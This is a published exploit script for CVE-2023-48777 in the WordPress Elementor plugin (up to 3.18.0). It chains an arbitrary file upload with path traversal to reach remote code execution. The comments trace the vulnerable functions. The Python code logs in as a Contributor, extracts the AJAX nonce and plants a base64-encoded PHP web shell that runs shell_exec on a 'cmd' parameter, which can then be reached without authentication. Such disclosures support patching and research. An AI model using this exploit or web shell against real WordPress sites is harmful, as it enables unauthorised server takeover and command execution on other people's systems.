# Exploit Title: WordPress Plugin Elementor up to 3.18.0 - Arbitrary File Upload / Path Traversal to Remote Code Execution (RCE) (Authenticated)
# Date: 02/16/2024
# Exploit Author: AkuCyberSec (https://github.com/AkuCyberSec)
# Vendor Homepage: https://elementor.com/
# Software Link: https://wordpress.org/plugins/elementor/advanced/ (scroll down to select the version)
# Version: up to 3.18.0
# Tested on: WordPress 6.4.3 | Elementor 3.17.1
# Vulnerability Researcher: Hồng Quân
# CVE: CVE-2023-48777

import requests, re, base64, os
from urllib.parse import quote

# # # # # REQUIREMENTS # # # # #
# This exploit requires valid credentials with, at least, Contributor privilege.

# # # # # ORIGINAL AUTHOR # # # # #
# The vulnerability was discovered by the researcher Hồng Quân (December 6, 2023).

# # # # # VULNERABILITY DESCRIPTION # # # # #
# The WordPress plugin called Elementor (up to 3.18.0; exploit tested on 3.17.1) is affected by 2 vulnerabilities:
# 1. Arbitrary File Upload
# 2. Path Traversal
#
# These vulnerabilities can lead to a Remote Code Execution.
# Although the Arbitrary File Upload is still present on the version 3.18.1, the Path Traversal isn't.
# The path traversal allows the attacker to move the file in a known directory, instead of a directory with a random name.
# This exploit was made to exploit BOTH vulnerabilities.

# # # # # WORKFLOW # # # # #
# File: elementor/includes/template-library/manager.php
# Function: import_template
# The function "import_template" calls the function handle_elementor_upload:
# $upload_result = Plugin::$instance->uploads_manager->handle_elementor_upload( $data, [ 'zip', 'json' ] );
#
# File: elementor/core/files/uploads-manager.php
# Functions: handle_elementor_upload -> save_base64_to_tmp_file -> create_temp_file
# If the POST request contains the parameter "fileData" with a Base64 encoded value, the plugin tries to decode it and save the value in a temporary file.
# The name of the temporary file can be passed in the parameter "fileName" (see function save_base64_to_tmp_file).
# The function "create_temp_file" is vulnerable to Path Traversal, so the parameter "fileName" can be exploited to save the file in a known directory.

# # # # # EXPLOIT STEPS # # # # #
# 1. Login to WordPress
# 2. Get the nonce for AJAX calls
# 3. Upload YOUR payload as Base64
#   3a. The payload will be uploaded to baseUrl/wordpress/wp-content/uploads/elementor/tmp/payload.php
# 4. Browse to the page of the uploaded payload

# # # # # PAYLOAD SAMPLE # # # # #
# Decoded: <?php echo isset($_GET['cmd']) ? shell_exec($_GET['cmd']) : null; ?>
# Base64 Encoded: PD9waHAgZWNobyBpc3NldCgkX0dFVFsnY21kJ10pID8gc2hlbGxfZXhlYygkX0dFVFsnY21kJ10pIDogbnVsbDsgPz4K
# Filename: payload.php
# Payload remote file path: http://baseUrl/wordpress/wp-content/uploads/elementor/tmp/payload.php?cmd=whoami

payloadFileName = './payload.php' # Local path of YOUR payload
baseUrl = 'http://127.0.0.1/wordpress/' # Base URL of the WordPress installation
username = 'contributor' # The user must have at least Contributor privileges
password = 'password' # Set the password

session = requests.Session()
cookies = { 'wordpress_test_cookie' : 'WP+Cookie+check' } # WordPress needs this to tell if browser can manage cookies
nonce = None

def DoLogin(username, password):
    global cookies, nonce
    loginUrl = baseUrl + 'wp-login.php'
    adminUrl = baseUrl + 'wp-admin/'
    data = { 'log' : username, 'pwd' : password, 'wp-submit' : 'Login', 'redirect_to' : adminUrl, 'testcookie' : 1 }

    print(f"Login using {username}:{password}")

    # search for: "ajax":{"url":"http:\/\/baseUrl\/wp-admin\/admin-ajax.php","nonce":"a2cd425788"}
    # a2cd425788 is just an example of nonce. It can be anything else.
    regexp = re.compile('"ajax":\\{"url":".+admin\\-ajax\\.php","nonce":"([a-zA-Z0-9]+)"\\}')  
    response = session.post(loginUrl, cookies=cookies, data=data)

    search = regexp.search(response.text)

    if not search:
        # Fix the regexp if needed.
        print('Error - Invalid credentials? Print the response text to investigate further.')
        # print(response.text)
        return False
    else:
        nonce = search.group(1)
        print("Login OK")
        print(f"Nonce found: {nonce}")
        return True

def UploadPayload():
    uploadUrl = baseUrl + 'wp-admin/admin-ajax.php'
    payloadRemoteFileName = f'/../{os.path.basename(payloadFileName)}' # Add "/../" to upload the file in a known directory (see: payloadRemotePath)
    payloadRemotePath = f'{baseUrl}wp-content/uploads/elementor/tmp/{os.path.basename(payloadFileName)}'
    encodedPayload = None

    with open(payloadFileName, "rb") as payload:
        encodedPayload = base64.b64encode(payload.read())
        print(f"Encoded Payload: {encodedPayload}")

    # # # # # HOW UPLOAD WORKS # # # # # 
    # The request will NOT upload the file in the traditional way.
    # In fact, even if the Content-Type must be "application/x-www-form-urlencoded", the parameters can be passed like a normal POST request and there's no need to upload a file.
    # As you can see below, the exploit does NOT use the parameter "files" for the function session.post(), and that's why we must set explicitly the Content-Type header.
    # The file that will be uploaded is specified in the parameter "fileData" (Base64 encoded value), and its name is specified in "fileName".
    #
    # Because of this, the server will reply with an Internal Server Error (status_code = 500), even if the upload was successfull.
    # So, if we see that status code, we try to reach for the payload at payloadRemotePath.
    # If the response is 200 (OK), the payload was uploaded successfully.
    
    # # # # # WARNING # # # # # 
    # 1. The payload will be overwritten if we run the exploit multiple times.
    # 2. After the upload, the payload can be reached even if we're not authenticated.
        
    print(f"Uploading payload {os.path.basename(payloadFileName)}")
    data = { 'action' : 'elementor_library_direct_actions', '_nonce' : nonce, 'library_action' : 'import_template', 'fileData' : encodedPayload, 'fileName' : quote(payloadRemoteFileName)}
    response = session.post(uploadUrl, data=data, headers={"Content-Type" : "application/x-www-form-urlencoded"})

    if (response.status_code == 500):
        payloadResponse = session.get(payloadRemotePath)
        print(f"Server replied with status code 500 as expected.")
        if (payloadResponse.status_code == 200):
            print(f"The page of the payload replied with status code 200 as expected. Payload can be found here: {payloadRemotePath}")
            return
        elif (payloadResponse.status_code == 500):
            print(f"The page of the payload replied with status code 500. Maybe there's an error in the payload you've uploaded: {payloadRemotePath}")
            return
        elif (payloadResponse.status_code == 404):
            print(f"The page of the payload replied with status code 404. The payload can NOT be found here: {payloadRemotePath}")
            return
    
    print("Something went wrong. Try to print the response to investigate further.")

def Main():
    
    if not (DoLogin(username, password)):
        exit()

    UploadPayload()

Main()
